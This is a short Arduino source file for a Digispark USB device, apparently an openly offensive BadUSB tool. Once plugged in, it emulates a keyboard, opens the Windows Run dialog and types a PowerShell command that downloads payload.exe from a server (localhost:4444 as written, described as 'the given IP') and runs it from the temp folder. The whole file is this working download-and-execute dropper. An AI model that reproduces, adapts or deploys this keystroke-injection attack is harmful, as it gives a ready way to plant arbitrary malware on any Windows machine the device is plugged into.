#include "DigiKeyboard.h"

//Author : Paranoid Ninja
//Email  : paranoidninja@protonmail.com
//Descr  : The script downloads a payload from the given IP via powershell and executes it

void setup() {
}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print("(New-Object System.Net.WebClient).DownloadFile(\"http://localhost:4444/payload.exe\",\"$env:temp\\payload.exe\");[System.Diagnostics.Process]::Start(\"$env:temp\\payload.exe\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) {
 }
}
